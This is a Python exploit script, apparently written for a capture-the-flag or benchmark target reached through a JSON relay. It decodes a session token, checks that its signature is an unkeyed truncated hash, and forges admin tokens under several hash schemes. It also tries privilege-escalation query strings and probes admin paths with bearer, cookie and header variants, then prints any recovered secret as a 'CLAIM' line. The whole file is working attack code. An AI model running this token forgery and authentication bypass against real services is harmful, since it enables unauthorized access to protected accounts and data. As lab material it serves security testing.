import json, sys, base64, hashlib, re

def req(method, path, headers=None, body=None):
    m = {"http": {"method": method, "path": path}}
    if headers:
        m["http"]["headers"] = headers
    if body is not None:
        m["http"]["body"] = body
    try:
        sys.stdout.write(json.dumps(m) + "\n")
        sys.stdout.flush()
    except Exception:
        return None
    line = sys.stdin.readline()
    if not line:
        return None
    try:
        r = json.loads(line)
    except Exception:
        return None
    b = r.get("body_b64")
    t = ""
    if b:
        try:
            t = base64.b64decode(b).decode("utf-8", "replace")
        except Exception:
            t = ""
    return (r.get("status"), t)

log = []
def L(s):
    log.append(str(s)[:400])

def forge(u, lvl, mode="std"):
    if mode == "std":
        msg = "%s:%s" % (u, lvl)
        sig = hashlib.sha256(msg.encode()).hexdigest()[:16]
    elif mode == "md5":
        sig = hashlib.md5(("%s:%s" % (u, lvl)).encode()).hexdigest()[:16]
    else:
        sig = hashlib.sha256(("%s%s" % (u, lvl)).encode()).hexdigest()[:16]
    obj = {"u": u, "lvl": lvl, "sig": sig}
    return base64.b64encode(json.dumps(obj).encode()).decode()

def norm(s):
    s = (s or "").strip()
    if s[:2].lower() == "0x":
        s = s[2:]
    if re.fullmatch(r"[0-9a-fA-F]+", s):
        return s.lower()
    try:
        raw = base64.b64decode(s, validate=True)
        if len(raw) >= 8:
            return raw.hex()
    except Exception:
        pass
    m = re.findall(r"[0-9a-fA-F]{16,}", s)
    if m:
        return m[0].lower()
    return None

def extract(body):
    try:
        d = json.loads(body)
    except Exception:
        d = None
    def walk(o):
        if isinstance(o, dict):
            for k, v in o.items():
                if isinstance(v, str) and ("secret" in k.lower() or k.lower() in ("reserved", "flag", "data")):
                    return v
            for v in o.values():
                r = walk(v)
                if r:
                    return r
        elif isinstance(o, list):
            for v in o:
                r = walk(v)
                if r:
                    return r
        return None
    v = walk(d)
    if v is None:
        m = re.findall(r"[0-9a-fA-F]{16,}", body or "")
        if m:
            return m[0]
        return None
    n = norm(v)
    return n

r = req("GET", "/session")
L("session=%s" % (r,))
base_tok = None
if r and r[1]:
    m = re.search(r'"token"\s*:\s*"([^"]+)"', r[1])
    if m:
        base_tok = m.group(1)
if base_tok:
    try:
        obj = json.loads(base64.b64decode(base_tok).decode())
        L("obj=%s" % obj)
        sig = hashlib.sha256(("%s:%s" % (obj.get("u"), obj.get("lvl"))).encode()).hexdigest()[:16]
        L("scheme_match=%s" % (sig == obj.get("sig")))
    except Exception as e:
        L("derr %s" % e)

tokens = []
for q in ["/session?u=admin&lvl=admin", "/session?u=admin", "/session?lvl=admin",
          "/session?user=admin&level=admin", "/session?u=admin&lvl=admin&role=admin"]:
    rr = req("GET", q)
    L("%s -> %s" % (q, rr))
    if rr and rr[1]:
        m = re.search(r'"token"\s*:\s*"([^"]+)"', rr[1])
        if m:
            tokens.append(m.group(1))
for u in ["admin", "root", "user", ""]:
    for lvl in ["admin", "root", "user", ""]:
        tokens.append(forge(u, lvl, "std"))
for u in ["admin"]:
    for lvl in ["admin", "user"]:
        tokens.append(forge(u, lvl, "md5"))
        tokens.append(forge(u, lvl, "cat"))

secret = None
secret_body = None
secret_tok = None
seen = set()
uniq = []
for t in tokens:
    if t and t not in seen:
        seen.add(t)
        uniq.append(t)

for t in uniq:
    rr = req("GET", "/admin", {"Authorization": "Bearer " + t})
    st = rr[0] if rr else None
    bd = rr[1] if rr else ""
    if st not in (401, 403, 404, None):
        L("HIT /admin tok=%s st=%s body=%s" % (t[:40], st, bd[:300]))
        if secret is None:
            e = extract(bd)
            if e:
                secret = e
                secret_body = bd
                secret_tok = t
                break
    else:
        L("miss %s st=%s %s" % (t[:24], st, bd[:80]))

if secret is None:
    hdrsets = [
        {"Authorization": "Bearer " + (secret_tok or uniq[0])},
    ]
    for p in ["/admin", "/admin/", "/admin/secret", "/secret", "/admin/flag", "/admin/area",
              "/api/admin", "/admin/reserved", "/reserved", "/admin/info"]:
        for h in hdrsets:
            rr = req("GET", p, h)
            if rr and rr[0] not in (401, 403, 404, None):
                L("PATH %s -> %s %s" % (p, rr[0], rr[1][:300]))
                e = extract(rr[1])
                if e and secret is None:
                    secret = e
                    secret_body = rr[1]
    if secret is None and uniq:
        t = uniq[0]
        for p, h in [
            ("/admin", {"X-Session": t, "X-Token": t}),
            ("/admin", {"Cookie": "session=" + t}),
            ("/admin?token=" + t, {"Authorization": "Bearer " + t}),
        ]:
            rr = req("GET", p, h)
            L("ALT %s -> %s" % (p[:30], rr))
            if rr and rr[0] not in (401, 403, 404, None):
                e = extract(rr[1])
                if e and secret is None:
                    secret = e

L("SECRET=%s" % secret)
L("BODY=%s" % (secret_body or "")[:500])
sys.stderr.write("\n".join(log) + "\n")
print("CLAIM:" + json.dumps({"secret_hex": secret or ""}))